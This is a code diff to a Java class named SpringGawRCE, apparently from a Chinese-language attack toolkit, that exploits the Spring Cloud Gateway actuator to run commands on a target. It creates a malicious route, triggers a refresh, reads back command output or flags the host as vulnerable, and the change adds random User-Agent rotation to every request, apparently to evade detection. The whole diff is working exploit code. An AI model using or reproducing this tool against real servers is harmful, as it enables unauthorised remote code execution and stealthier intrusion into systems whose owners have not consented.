@@ -1,5 +1,7 @@
 package src.main.module;
 
+import src.main.common.UA_Config;
+
 import java.io.BufferedReader;
 import java.io.IOException;
 import java.io.InputStreamReader;
@@ -7,6 +9,7 @@ import java.io.OutputStream;
 import java.net.HttpURLConnection;
 import java.net.URL;
 import java.util.Arrays;
+import java.util.List;
 import java.util.regex.Matcher;
 import java.util.regex.Pattern;
 import java.util.stream.Collectors;
@@ -68,6 +71,7 @@ public class SpringGawRCE {
         String api = "";
         String data = "";
         String res = "";
+        String ua = "";
         if (command == null) {
             api = "/actuator/gateway/routes/poctest";
             data = pocData;
@@ -78,54 +82,66 @@ public class SpringGawRCE {
         String refapi = "/actuator/gateway/refresh";
         String site = address + api;
         disableSSLVerification();
-        URL urlobj = new URL(site);
-        HttpURLConnection conn = (HttpURLConnection) urlobj.openConnection();
-        conn.setRequestMethod("POST");
-        conn.setRequestProperty("Content-Type", "application/json");
-        conn.setDoOutput(true);
-        try (OutputStream os = conn.getOutputStream()) {
-            byte[] input = data.getBytes("utf-8");
-            os.write(input, 0, input.length);
-        }
-        int responseCode = conn.getResponseCode();
-        if (responseCode == HttpURLConnection.HTTP_CREATED){
-            String site1 = address + refapi;
-            URL urlobj1 = new URL(site1);
-            HttpURLConnection conn1 = (HttpURLConnection) urlobj1.openConnection();
-            conn1.setRequestMethod("POST");
-            conn1.setRequestProperty("Content-Type","application/x-www-form-urlencoded");
-            conn1.setDoOutput(true);
-            int responseCode1 = conn1.getResponseCode();
-            if (responseCode1 == HttpURLConnection.HTTP_OK){
-                URL urlobj2 = new URL(site);
-                HttpURLConnection conn2 = (HttpURLConnection) urlobj2.openConnection();
-                conn2.setRequestMethod("GET");
-                conn2.setDoOutput(true);
-                BufferedReader in = new BufferedReader(new InputStreamReader(conn2.getInputStream()));
-                String inputLine;
-                StringBuilder content = new StringBuilder();
-                while ((inputLine = in.readLine()) != null) {
-                    content.append(inputLine);
-                    res = inputLine.toString();
-                }
-                int responseCode2 = conn2.getResponseCode();
-                if (responseCode2 == HttpURLConnection.HTTP_OK){
-                    if (!res.contains("poctest")) {
-                        String resultPattern = "Result\\s*=\\s*'([^\\n]*)'";
-                        Pattern pattern = Pattern.compile(resultPattern);
-                        Matcher matcher = pattern.matcher(content.toString());
-                        if (matcher.find()) {
-                            String result = "当前命令回显:\n" + matcher.group(1).replace("\\n", "\n");
-                            builder.add(result);
-                        }
-                    }else {
-                        builder.add(address + " " + "存在RCE漏洞!");
-                    }
-                }else{
-                    builder.add("POST request failed with response code: " + responseCode1);
-                }
-                in.close();
+        try {
+            URL urlobj = new URL(site);
+            HttpURLConnection conn = (HttpURLConnection) urlobj.openConnection();
+            UA_Config uacf = new UA_Config();
+            List<String> ualist = uacf.loadUserAgents();
+            ua = uacf.getRandomUserAgent(ualist);
+            conn.setRequestProperty("User-Agent",ua);
+            conn.setRequestMethod("POST");
+            conn.setRequestProperty("Content-Type", "application/json");
+            conn.setDoOutput(true);
+            try (OutputStream os = conn.getOutputStream()) {
+                byte[] input = data.getBytes("utf-8");
+                os.write(input, 0, input.length);
             }
+            int responseCode = conn.getResponseCode();
+            if (responseCode == HttpURLConnection.HTTP_CREATED) {
+                String site1 = address + refapi;
+                URL urlobj1 = new URL(site1);
+                HttpURLConnection conn1 = (HttpURLConnection) urlobj1.openConnection();
+                ua = uacf.getRandomUserAgent(ualist);
+                conn1.setRequestProperty("User-Agent",ua);
+                conn1.setRequestMethod("POST");
+                conn1.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
+                conn1.setDoOutput(true);
+                int responseCode1 = conn1.getResponseCode();
+                if (responseCode1 == HttpURLConnection.HTTP_OK) {
+                    URL urlobj2 = new URL(site);
+                    HttpURLConnection conn2 = (HttpURLConnection) urlobj2.openConnection();
+                    ua = uacf.getRandomUserAgent(ualist);
+                    conn2.setRequestProperty("User-Agent",ua);
+                    conn2.setRequestMethod("GET");
+                    conn2.setDoOutput(true);
+                    BufferedReader in = new BufferedReader(new InputStreamReader(conn2.getInputStream()));
+                    String inputLine;
+                    StringBuilder content = new StringBuilder();
+                    while ((inputLine = in.readLine()) != null) {
+                        content.append(inputLine);
+                        res = inputLine.toString();
+                    }
+                    int responseCode2 = conn2.getResponseCode();
+                    if (responseCode2 == HttpURLConnection.HTTP_OK) {
+                        if (!res.contains("poctest")) {
+                            String resultPattern = "Result\\s*=\\s*'([^\\n]*)'";
+                            Pattern pattern = Pattern.compile(resultPattern);
+                            Matcher matcher = pattern.matcher(content.toString());
+                            if (matcher.find()) {
+                                String result = "当前命令回显:\n" + matcher.group(1).replace("\\n", "\n");
+                                builder.add(result);
+                            }
+                        } else {
+                            builder.add(address + " " + "存在RCE漏洞!");
+                        }
+                    } else {
+                        builder.add("POST request failed with response code: " + responseCode1);
+                    }
+                    in.close();
+                }
+            }
+        }catch (Exception e){
+            e.printStackTrace();
         }
         return builder.build();
     }
